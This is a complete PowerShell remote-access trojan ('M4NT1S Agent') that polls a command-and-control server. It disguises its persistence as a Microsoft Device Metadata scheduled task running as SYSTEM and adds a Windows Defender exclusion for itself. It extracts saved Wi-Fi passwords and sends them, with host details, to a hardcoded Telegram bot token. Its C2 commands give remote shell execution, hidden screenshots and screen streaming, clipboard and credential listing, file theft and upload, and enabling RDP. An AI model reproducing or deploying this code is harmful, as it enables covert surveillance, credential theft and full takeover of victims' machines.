# ============================================================
# M4NT1S Agent - no SSH, no VPS. Cloudflare tunnel to c2.py only.
# ============================================================
param([string]$Mode = "auto")
if (-not $Mode) { $Mode = "auto" }

# ---------- CONFIG ----------
$C2Url      = "https://c2.computerfix.services/api/v1"
$TgBotToken = "8609491076:AAEa7h3yGrolKQI93NbSMIKKLrpgu4eyVEE"
$TgChatId   = "7984959772"
# ----------------------------

$InstallDir = "C:\ProgramData\Microsoft\DeviceMetadata"
$AgentTask  = "Microsoft\Windows\Device Setup\Device Metadata Refresh"
$SelfPath   = "$InstallDir\a.ps1"
$LockFile   = "$InstallDir\installed.lock"
$LogFile    = "$InstallDir\agent.log"

function Post($path, $obj) {
    $body = $obj | ConvertTo-Json -Compress -Depth 10
    Invoke-RestMethod -Uri "$C2Url$path" -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 20
}
function Log($msg) {
    $line = "$(Get-Date -Format o)  [pid $PID]  $msg"
    try {
        if (Test-Path $InstallDir) {
            if ((Get-Item $LogFile -ErrorAction SilentlyContinue).Length -gt 1048576) {
                Move-Item $LogFile "$LogFile.old" -Force -ErrorAction SilentlyContinue
            }
            $line | Out-File $LogFile -Append -ErrorAction SilentlyContinue
        }
    } catch { }
}
function Get-Admin {
    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
function Get-Domain {
    $cs = Get-CimInstance Win32_ComputerSystem
    if ($cs.PartOfDomain) { $cs.Domain } else { "WORKGROUP" }
}
function Get-WifiDetails {
    $rawName = $null
    try { $rawName = (Get-NetConnectionProfile).Name } catch { }
    $displaySsid = if ($rawName) { $rawName -replace '^Unidentified network\s+', '' } else { 'None' }
    $pass = 'None'
    $candidates = @()
    if ($rawName) { $candidates += $rawName }
    if ($displaySsid -and ($displaySsid -ne $rawName)) { $candidates += $displaySsid }
    foreach ($name in $candidates) {
        $pr = netsh wlan show profiles name="$name" key=clear 2>$null
        foreach ($l in $pr) {
            if ($l -match 'Key Content') { $pass = ($l -split ':', 2)[1].Trim(); break }
        }
        if ($pass -ne 'None') { break }
    }
    return @{ SSID = $displaySsid; Pass = $pass }
}
function Send-Telegram($status) {
    try {
        $n  = $env:COMPUTERNAME
        $ip = (Invoke-RestMethod -Uri 'https://ipinfo.io/ip' -TimeoutSec 10)
        $wifi = Get-WifiDetails
        $os = (Get-CimInstance Win32_OperatingSystem).Caption
        $msg = "[$status] C2 Connection`n`nDevice: $n`nIP: $ip`nSSID: $($wifi.SSID)`nPass: $($wifi.Pass)`nOS: $os"
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$TgBotToken/sendMessage" -Method Post -Body @{ chat_id = $TgChatId; text = $msg } -TimeoutSec 15 | Out-Null
        Log "[+] Telegram sent ($status) ssid=$($wifi.SSID) passlen=$($wifi.Pass.Length)"
    } catch { Log "[!] Telegram failed: $($_.Exception.Message)" }
}
function Resolve-PayloadSource {
    $cands = Get-CimInstance Win32_LogicalDisk -ErrorAction SilentlyContinue |
             Where-Object { $_.DriveType -eq 2 }
    foreach ($c in $cands) {
        if ($c.DeviceID -and (Test-Path "$($c.DeviceID)\payload.ps1")) {
            return "$($c.DeviceID)\payload.ps1"
        }
    }
    if ($PSCommandPath -and (Test-Path $PSCommandPath)) { return $PSCommandPath }
    if (Test-Path $SelfPath) { return $SelfPath }
    return $null
}
function Find-OtherAgents {
    Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
      Where-Object {
        $_.ProcessId -ne $PID -and
        $_.CommandLine -match 'DeviceMetadata\\a\.ps1' -and
        $_.CommandLine -match 'agent'
      } | Select-Object -ExpandProperty ProcessId
}

# ================== TELEGRAM (auto only) ==================
if ($Mode -eq "auto") {
    $st = if (Test-Path $LockFile) { 'Reconnected' } else { 'New' }
    Send-Telegram $st
}

# ================== INSTALL ==================
if ($Mode -eq "install" -or $Mode -eq "auto") {
    Log "[*] Installer starting"
    New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null

    # ---- DEFENDER EXCLUSION (must come before Copy-Item) ----
    if (Get-Admin) {
        try {
            Log "[*] Adding Defender exclusion for $InstallDir"
            Add-MpPreference -ExclusionPath $InstallDir -ErrorAction Stop
            $excl = (Get-MpPreference).ExclusionPath
            if ($excl -and ($excl -contains $InstallDir)) {
                Log "[+] Defender exclusion confirmed"
            } else {
                Log "[!] Exclusion not in Get-MpPreference after Add-MpPreference"
            }
        } catch {
            Log "[!] Defender exclusion failed: $($_.Exception.Message)"
        }
    } else {
        Log "[!] Not admin - cannot add Defender exclusion"
    }

    $src = Resolve-PayloadSource
    if (-not $src) { Log "[!] No payload source found. Aborting."; exit 1 }
    Log "[+] Source: $src"
    Copy-Item $src $SelfPath -Force
    Log "[+] Copied to $SelfPath"

    $others = Find-OtherAgents
    if ($others) {
        Log "[*] Killing existing agents: $($others -join ', ')"
        foreach ($p in $others) { Stop-Process -Id $p -Force -ErrorAction SilentlyContinue }
        Start-Sleep -Milliseconds 500
    }

    $psExe = "powershell -w h -ep bypass -f `"$SelfPath`""
    $createOut = schtasks /create /tn "$AgentTask" /tr "$psExe -Mode agent" /sc onstart /ru SYSTEM /rl highest /f 2>&1
    Log "[*] schtasks create: $createOut"

    # ---- CLEAR AC-POWER CONDITIONS ----
    # schtasks /create /sc onstart silently sets "no start on batteries",
    # which leaves the task Queued forever on a laptop that isn't on AC.
    try {
        $t = Get-ScheduledTask -TaskPath "\Microsoft\Windows\Device Setup\" -TaskName "Device Metadata Refresh" -ErrorAction Stop
        $t.Settings.DisallowStartIfOnBatteries = $false
        $t.Settings.StopIfGoingOnBatteries     = $false
        Set-ScheduledTask -TaskPath "\Microsoft\Windows\Device Setup\" -TaskName "Device Metadata Refresh" -Settings $t.Settings | Out-Null
        Log "[+] Battery conditions cleared on task"
    } catch {
        Log "[!] Failed to clear battery conditions: $($_.Exception.Message)"
    }

    "installed $(Get-Date -Format o)" | Out-File $LockFile

    $runOut = schtasks /run /tn "$AgentTask" 2>&1
    Log "[*] schtasks run: $runOut"
    Log "[*] Installer done."
    exit 0
}

# ================== AGENT ==================
$others = Find-OtherAgents
if ($others) { Log "[!] Another agent already running: $($others -join ', '). Exiting."; exit 0 }

$guid = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name MachineGuid).MachineGuid
$sha  = [System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($guid))
$fingerprint = ([BitConverter]::ToString($sha) -replace '-','').ToLower().Substring(0,16)

$admin  = Get-Admin
$domain = Get-Domain
$sessionId = (Get-Process -Id $PID).SessionId

Log "[*] Agent starting (admin=$admin domain=$domain session=$sessionId pid=$PID)"
Log "[*] C2Url=$C2Url"

function Register-WithC2 {
    for ($i = 0; $i -lt 30; $i++) {
        try {
            $reg = Post '/register' @{
                hostname    = $env:COMPUTERNAME
                os          = (Get-CimInstance Win32_OperatingSystem).Caption
                kernel      = (Get-CimInstance Win32_OperatingSystem).Version
                fingerprint = $fingerprint
                admin       = $admin
                domain      = $domain
            }
            if ($reg.numeric_id) {
                Log "[+] Registered as ID $($reg.numeric_id) (attempt $i)"
                return [int]$reg.numeric_id
            }
            Log "[!] Register attempt $i returned no numeric_id"
        } catch {
            Log "[!] Register attempt $i failed: $($_.Exception.Message)"
            Start-Sleep 20
        }
    }
    return $null
}

$id = Register-WithC2
if (-not $id) { Log "[!] Register failed after 30 attempts. Exiting."; exit 1 }

$global:streamJob       = $null
$global:killswitchArmed = $false

function Test-InteractiveSession { if ($sessionId -eq 0) { return $false } return $true }

# ---------------------------------------------------------------------------
# SCREENSHOT - runs in the interactive user session via schtasks hand-off.
#
# The agent is in Session 0 (SYSTEM) and has no desktop access. Capturing
# from Session 0 returns a black image (or throws). Instead we:
#   1. Encode the capture script as UTF-16LE base64 (-EncodedCommand form)
#   2. Create a one-shot scheduled task targeting the 'Users' group with
#      /it (interactive) so it runs inside the logged-on user's session
#   3. Launch it with `powershell -w h` so no window appears
#   4. Poll for the output file, read it, clean up
#
# Output file is under C:\Users\Public\ because both SYSTEM and every
# interactive user have write access there by default (no ACL surgery).
# ---------------------------------------------------------------------------
function Do-Screenshot {
    $capCode = @'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height
[System.Drawing.Graphics]::FromImage($bmp).CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size)
$ms = New-Object System.IO.MemoryStream
$bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
$bmp.Dispose()
$b64 = [Convert]::ToBase64String($ms.ToArray())
$b64 | Out-File -FilePath "C:\Users\Public\m4nt1s_cap.txt" -Encoding ASCII -Force
'@

    # UTF-16LE + base64 = valid -EncodedCommand payload. Never touches disk.
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($capCode))

    $outFile = "C:\Users\Public\m4nt1s_cap.txt"
    Remove-Item $outFile -Force -ErrorAction SilentlyContinue

    $taskName = "M4NT1S_ScreenCap"
    # -w h  = hidden window (no console flash)
    # /it   = interactive, runs in the logged-on user's session
    # /ru Users = run as whichever user is currently logged in
    schtasks /create /tn $taskName /tr "powershell -w h -ep bypass -enc $encoded" /sc once /st 00:00 /ru Users /it /f 2>$null | Out-Null
    schtasks /run /tn $taskName 2>$null | Out-Null

    # Poll for the file to appear AND stabilise (>100 chars = real JPEG b64)
    $b64 = $null
    for ($i = 0; $i -lt 20; $i++) {
        Start-Sleep -Milliseconds 250
        if (Test-Path $outFile) {
            $content = Get-Content $outFile -Raw -ErrorAction SilentlyContinue
            if ($content -and $content.Length -gt 100) {
                $b64 = $content.Trim()
                break
            }
        }
    }

    schtasks /delete /tn $taskName /f 2>$null | Out-Null
    Remove-Item $outFile -Force -ErrorAction SilentlyContinue

    if ($b64) {
        return "IMAGE:" + $b64
    }
    return "ERROR: Screenshot timed out (no interactive session, or display is locked)."
}

function Do-StreamStart($intervalMs) {
    # Stream requires a persistent process in the user session. Doing that
    # safely (single-instance, clean shutdown, no orphaned children) is a
    # bigger job than a one-shot hand-off, so stream stays unsupported
    # from Session 0. Returns a clean error to the C2 instead of failing
    # silently.
    if (-not (Test-InteractiveSession)) {
        return "ERROR: agent in session 0 (SYSTEM). Stream requires an interactive session."
    }
    if ($global:streamJob) { return "Stream already running (job pid $($global:streamJob.Id))." }
    if (-not $intervalMs -or $intervalMs -lt 100) { $intervalMs = 500 }
    $global:streamJob = Start-Job -ScriptBlock {
        param($interval, $c2, $slaveId)
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        while ($true) {
            try {
                $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                if (-not $b) { Start-Sleep -Milliseconds $interval; continue }
                $bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height
                $g = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size)
                $g.Dispose()
                $ms = New-Object System.IO.MemoryStream
                $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $bmp.Dispose()
                $b64 = [Convert]::ToBase64String($ms.ToArray())
                $body = @{ id = $slaveId; frame = $b64 } | ConvertTo-Json -Compress
                Invoke-RestMethod -Uri "$c2/stream" -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
            } catch { }
            Start-Sleep -Milliseconds $interval
        }
    } -ArgumentList $intervalMs, $C2Url, $id
    Start-Sleep -Milliseconds 800
    if ($global:streamJob.State -eq 'Failed' -or $global:streamJob.State -eq 'Completed') {
        $recv = Receive-Job -Job $global:streamJob -Keep -ErrorAction SilentlyContinue | Out-String
        Remove-Job -Job $global:streamJob -Force -ErrorAction SilentlyContinue
        $global:streamJob = $null
        return "Stream job failed: $recv"
    }
    return "Stream started (interval ${intervalMs}ms)"
}

function Do-StreamStop {
    if (-not $global:streamJob) { return "No stream running" }
    Stop-Job -Job $global:streamJob -ErrorAction SilentlyContinue
    Remove-Job -Job $global:streamJob -Force -ErrorAction SilentlyContinue
    $global:streamJob = $null
    return "Stream stopped"
}

function Do-Status {
    $os = Get-CimInstance Win32_OperatingSystem
    $up = (Get-Date) - $os.LastBootUpTime
    $wifi = Get-WifiDetails
    "User: $env:USERDOMAIN\$env:USERNAME`nAdmin: $admin`nHost: $env:COMPUTERNAME`nDomain: $domain`nSession: $sessionId`nSSID: $($wifi.SSID)`nOS: $($os.Caption) $($os.Version)`nUptime: $([int]$up.TotalHours)h $($up.Minutes)m"
}
function Do-Sysinfo {
    $groups = (Get-LocalGroup | Where-Object { (Get-LocalGroupMember $_.Name -ErrorAction SilentlyContinue).Name -contains "$env:USERDOMAIN\$env:USERNAME" } | Select-Object -Expand Name) -join ", "
    $adapters = (Get-NetAdapter | Where-Object Status -eq 'Up' | ForEach-Object { "$($_.Name)=$($_.InterfaceDescription)" }) -join " | "
    "Domain: $domain`nUser: $env:USERDOMAIN\$env:USERNAME`nGroups: $groups`nAdapters: $adapters"
}
function Do-Triangulate { (netsh wlan show networks mode=bssid 2>&1 | Out-String) }
function Do-Clipboard { try { (Get-Clipboard -Raw) } catch { "ERROR: $($_.Exception.Message)" } }
function Do-Processes {
    (Get-Process | Sort-Object WS -Descending | Select-Object -First 40 | ForEach-Object {
        "{0,-25} {1,8} {2,8}MB" -f $_.ProcessName, $_.Id, [math]::Round($_.WS/1MB)
    }) -join "`n"
}
function Do-Network { "=== ipconfig ===`n$(ipconfig /all | Out-String)`n=== route ===`n$(route print | Out-String)`n=== arp ===`n$(arp -a | Out-String)" }
function Do-Dns { (ipconfig /displaydns | Out-String) }
function Do-Defender {
    try {
        "=== Status ===`n$(Get-MpComputerStatus | Select-Object AMServiceEnabled, AntivirusEnabled, RealTimeProtectionEnabled | Format-List | Out-String)`n=== Exclusions ===`n$(Get-MpPreference | Select-Object ExclusionPath, ExclusionExtension | Format-List | Out-String)"
    } catch { "ERROR: $($_.Exception.Message)" }
}
function Do-PersistList {
    "=== Tasks ===`n$((Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' } | Select-Object -First 30 TaskName, TaskPath | Format-Table -AutoSize | Out-String))`n=== HKCU Run ===`n$((Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -ErrorAction SilentlyContinue | Format-List | Out-String))"
}
function Do-FilePull($path) {
    try {
        if (-not (Test-Path -LiteralPath $path)) { return "ERROR: not found: $path" }
        $bytes = [System.IO.File]::ReadAllBytes((Resolve-Path -LiteralPath $path))
        $name = Split-Path $path -Leaf
        return "FILE:${name}:" + [Convert]::ToBase64String($bytes)
    } catch { return "ERROR: $($_.Exception.Message)" }
}
function Do-FilePush($path, $b64) {
    try {
        $bytes = [Convert]::FromBase64String($b64)
        [System.IO.File]::WriteAllBytes($path, $bytes)
        "Wrote $($bytes.Length) bytes to $path"
    } catch { return "ERROR: $($_.Exception.Message)" }
}
function Do-CredList {
    "=== cmdkey ===`n$(cmdkey /list | Out-String)`n=== vault ===`n$(vaultcmd /listcreds:'Windows Credentials' 2>&1 | Out-String)"
}
function Do-History {
    $p = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $p) { Get-Content $p -Tail 200 | Out-String } else { "no PS history" }
}
function Do-RdpEnable {
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
    "RDP enabled"
}
function Do-RdpDisable {
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 1
    Disable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
    "RDP disabled"
}
function Do-Killswitch {
    $global:killswitchArmed = $true
    if ($global:streamJob) {
        Stop-Job -Job $global:streamJob -ErrorAction SilentlyContinue
        Remove-Job -Job $global:streamJob -Force -ErrorAction SilentlyContinue
        $global:streamJob = $null
    }
    schtasks /delete /tn "$AgentTask" /f 2>$null | Out-Null
    schtasks /delete /tn "M4NT1S_ScreenCap" /f 2>$null | Out-Null
    Unregister-ScheduledTask -TaskPath "\Microsoft\Windows\Device Setup\" -TaskName "Device Metadata Refresh" -Confirm:$false -ErrorAction SilentlyContinue
    Remove-Item "C:\Users\Public\m4nt1s_cap.txt" -Force -ErrorAction SilentlyContinue
    Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
      Where-Object { $_.ProcessId -ne $PID -and $_.CommandLine -match 'DeviceMetadata\\a\.ps1' } |
      ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c timeout /t 3 /nobreak >nul & rmdir /s /q `"$InstallDir`"" -WindowStyle Hidden
    return "KILLSWITCH triggered; agent will self-terminate after result posts"
}

function Invoke-Cmd($job) {
    $cmd = $job.command
    $pl  = $job.payload
    switch ($cmd) {
        'STATUS'              { Do-Status }
        'SYSINFO'             { Do-Sysinfo }
        'SHELL'               { (cmd /c $pl.cmd 2>&1 | Out-String) }
        'SCREEN_CAPTURE'      { Do-Screenshot }
        'SCREEN_STREAM_START' { Do-StreamStart $pl.interval_ms }
        'SCREEN_STREAM_STOP'  { Do-StreamStop }
        'TRIANGULATE'         { Do-Triangulate }
        'CLIPBOARD_GET'       { Do-Clipboard }
        'PROCESSES'           { Do-Processes }
        'NETWORK_INFO'        { Do-Network }
        'DNS_CACHE'           { Do-Dns }
        'DEFENDER_CHECK'      { Do-Defender }
        'PERSIST_LIST'        { Do-PersistList }
        'TASK_CLEANUP'        { Do-Killswitch }
        'FILE_PULL'           { Do-FilePull $pl.path }
        'FILE_PUSH'           { Do-FilePush $pl.path $pl.data_b64 }
        'CRED_LIST'           { Do-CredList }
        'HISTORY_READ'        { Do-History }
        'RDP_ENABLE'          { Do-RdpEnable }
        'RDP_DISABLE'         { Do-RdpDisable }
        'KILLSWITCH'          { Do-Killswitch }
        default               { "ERROR: unknown command: $cmd" }
    }
}

$pollCount   = 0
$lastLogTick = 0
while ($true) {
    try {
        $job = Post '/poll' @{ id = $id; admin = $admin; domain = $domain }
        $pollCount++
        if ($job.command -eq 'RE-REGISTER') {
            Log "[!] C2 lost our slave row. Re-registering..."
            $newId = Register-WithC2
            if ($newId) { $id = $newId; Log "[+] Re-registered as ID $id" }
            else { Log "[!] Re-register failed, continuing with old ID" }
        }
        elseif ($job -and $job.command -and $job.command -ne 'NOP') {
            Log "[>] cmd #$($job.task_id): $($job.command)"
            $out = Invoke-Cmd $job
            if ($null -eq $out) { $out = "" }
            Post '/result' @{ id = $id; task_id = $job.task_id; status = 'completed'; output = [string]$out; exit_code = 0 } | Out-Null
            Log "[<] done #$($job.task_id)"
            if ($global:killswitchArmed) { Log "[!] KILLSWITCH armed, exiting"; Start-Sleep -Milliseconds 300; Stop-Process -Id $PID -Force }
        }
        if (($pollCount - $lastLogTick) -ge 60) { Log "[*] heartbeat (poll #$pollCount)"; $lastLogTick = $pollCount }
    } catch {
        Log "[!] poll error: $($_.Exception.Message)"
        Start-Sleep -Seconds 5
    }
    Start-Sleep -Milliseconds 1000
}